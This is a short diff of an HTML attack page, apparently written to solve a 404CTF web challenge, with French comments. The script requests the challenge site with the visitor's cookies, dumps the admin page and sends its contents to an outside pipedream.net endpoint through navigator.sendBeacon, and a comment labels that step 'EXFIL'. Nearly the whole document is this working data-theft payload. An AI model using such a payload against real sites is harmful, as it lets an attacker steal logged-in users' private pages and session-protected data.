@@ -1,14 +1,18 @@
 <!DOCTYPE html><meta charset="utf-8" />
 <h1>Dump admin :</h1>
 <pre id="out">…</pre>
+
 <script>
   (async () => {
-    // on est served PAR TON SERVEUR, donc PAS de CSP "script-src none"
-    // et le navigateur pense toujours être sur spacefleetcommand
-    const html = await fetch("/", { credentials: "include" }).then((r) =>
-      r.text()
-    );
+    // 1) Fetch absolu sur le CTF → COOKIE PART !
+    const html = await fetch("https://spacefleetcommand.404ctf.fr/", {
+      credentials: "include",
+    }).then((r) => r.text());
+
+    // 2) Affichage pour debug
     out.textContent = html;
+
+    // 3) EXFIL
     navigator.sendBeacon("https://eoyi24wnc60zgb.m.pipedream.net", html);
   })();
 </script>
